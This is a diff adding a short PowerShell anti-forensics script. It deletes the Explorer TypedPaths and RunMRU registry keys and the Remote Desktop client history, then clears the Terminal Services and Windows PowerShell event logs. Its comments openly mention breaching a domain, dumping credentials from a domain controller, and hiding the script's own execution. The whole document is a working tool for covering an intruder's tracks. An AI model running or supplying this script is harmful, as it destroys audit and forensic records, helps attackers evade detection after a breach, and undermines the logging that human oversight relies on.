@@ -1,0 +1,8 @@
+Remove-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths -recurse # Remove all explorer entries
+Remove-Item -Path HKCU:\Software\Microsoft\Terminal Server Client\Default -recurse # Clear remote desktop logs
+Remove-Item -Path HKCU:\Software\Microsoft\Terminal Server Client\Servers -Recurse # ^
+Remove-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Recurse # Lets not show our terminal services history in the run menu please and thank you MSTSC /v:The.Domain.That.I.Just.Breached.And.You.Dont.Know
+Clear-EventLog "TerminalServices-LocalSessionManager" # We are not the RDP connection log you are looking for ;)
+Clear-EventLog "TerminalServices-RemoteConnectionManager" # What domain controller we dumped the credentials from?
+Clear-EventLog "TerminalServices-ClientActiveXCore" # All those active X errors we caused? Yeah they never happened.
+Clear-EventLog "Windows PowerShell" # Lastly lets keep our running of this script low key for science
